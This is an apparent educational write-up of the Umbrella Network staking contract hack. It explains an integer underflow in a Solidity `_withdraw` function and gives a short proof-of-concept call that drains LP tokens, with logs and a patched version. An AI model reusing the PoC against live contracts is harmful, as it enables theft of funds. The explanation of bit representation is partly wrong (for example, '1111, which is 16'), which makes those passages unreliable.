# Umbrella

![hi Image](../images/umbrella/jo.avif)

## What's Umbrella?
Umbrella Network is a community owned, scalable and cost efficient oracle for the DeFi and blockchain community. 
Umbrella believes a community owned Oracle is not only possible, but essential to creating a truly decentralized financial system.

## Amount stolen
**$700k USD**



## Vulnerability
Underflow


## Analysis

The contract was exploited by underflow, the way underflow works is that numbers are basicly bits, for example if a number has uint8 it wil be 0000 for the number 0, but if you subsctract 1 it will be 1111, which is 16, the same is used in this line `_balances[user] = _balances[user] - amount;` where the balanc eof the user was 0 and it gets deducted by a value. yes the balance wouldn't be a negative number but `2^256 - 50`


### Representation of Numbers:

- In Solidity, numbers are typically represented using two's complement notation.
- For example, in a uint8 (8-bit unsigned integer), the binary representation of 0 is 00000000, and if you subtract 1, it becomes 11111111, which is 255 in decimal.

### Underflow in Solidity:
- In Solidity, unsigned integers cannot become negative through underflow. If you subtract a value from 0, it will wrap around to the maximum value for that data type.
- For example, subtracting 1 from 0 in a uint8 will result in 255.

### 2^256 - 50:
- Solidity uses modular arithmetic, so subtracting 50 from 2^256 will not result in a negative number. It will wrap around and be equivalent to 2^256 - 50.

### SafeMath:
- To prevent underflows and overflows, especially in balance-related calculations, it's recommended to use SafeMath or similar libraries.
- SafeMath includes checks to ensure that arithmetic operations cannot result in underflows or overflows.
So, in your case, if you're using _balances[user] = _balances[user] - amount; without SafeMath, and _balances[user] is 0, subtracting amount will wrap around to the maximum value of the data type, not become negative. However, using SafeMath is a good practice to prevent unintended behavior due to underflows.


### Exploited code

```solidity
      function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
        require(amount != 0, "Cannot withdraw 0");

        // not using safe math, because there is no way to overflow if stake tokens not overflow
        _totalSupply = _totalSupply - amount;
        _balances[user] = _balances[user] - amount;   //<---- underflow here.

        require(stakingTOken.transfer(recipent,amount),"token transfer failed");
      }
```

#### for example:

```
// Initial state
_totalSupply = 100;
_balances[user] = 0;
amount = 50;  // the amount to withdraw 

// After withdrawal
_totalSupply = _totalSupply - amount;  // 100 - 50 = 50
_balances[user] = _balances[user] - amount;  // 0 - 50 = underflow
```


# proof of concept (PoC) 


```solidity
       emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);

       StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.

       emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
```

Logs:
```
  Before exploiting, Attacker UniLP Balance: 0.000000000000000000
  After exploiting, Attacker UniLP Balance: 8792.873290680252648282
```


# Solution

The method `_withdraw` should check wether the user has enough balance, and/or to prevent underflow it can use the `safe math` library using `.sub` instead of a `-` sign

```solidity
  function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant {
        require(amount != 0, "Cannot withdraw 0");
        require(_balances[user] >= amount, "Insufficient balance for withdrawal");

        // Use safe math to prevent underflow
        _totalSupply = _totalSupply.sub(amount);
        _balances[user] = _balances[user].sub(amount);

        require(stakingTOken.transfer(recipent,amount),"token transfer failed");
    }

```


# Summary

Underflows are extremely common in smart contracts and they should be prevented by the safemath library 
especially in methods involving transactions, to safeguard against underflows. While it may introduce 
additional gas costs, the security benefits far outweigh the risks associated with potential vulnerabilities 



**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Umbrella_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
